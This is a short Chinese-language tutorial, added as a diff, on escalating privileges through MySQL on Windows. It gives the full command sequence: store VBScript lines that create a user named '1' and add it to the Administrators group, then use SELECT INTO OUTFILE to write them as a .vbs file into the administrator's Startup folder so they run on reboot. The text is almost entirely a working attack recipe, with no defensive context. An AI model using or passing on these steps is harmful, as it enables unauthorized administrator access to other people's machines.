@@ -1,0 +1,26 @@
+启动项提权：
+
+1、查看我们进入数据库中有些什么数据表
+mysql>show tables;
+默认的情况下，test中没有任何表的存在。
+以下为关键的部分
+2、在TEST数据库下创建一个新的表；
+mysql>create table a (cmd text);
+好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd，为text文本。
+3、在表中插入内容
+mysql>insert into a values ("set wshshell=createobject (""wscript.shell"")");
+mysql>insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");
+mysql>insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0)");
+注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序！
+4、好了，现在我们来看看表a中有些什么
+mysql>select * from a;
+我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
+5、输出表为一个VBS的脚本文件
+mysql>select * from a into outfile "c://docume~1//administrator//「开始」菜单//程序//启动//a.vbs";
+6.重启即可！
+
+
+
+
+
+
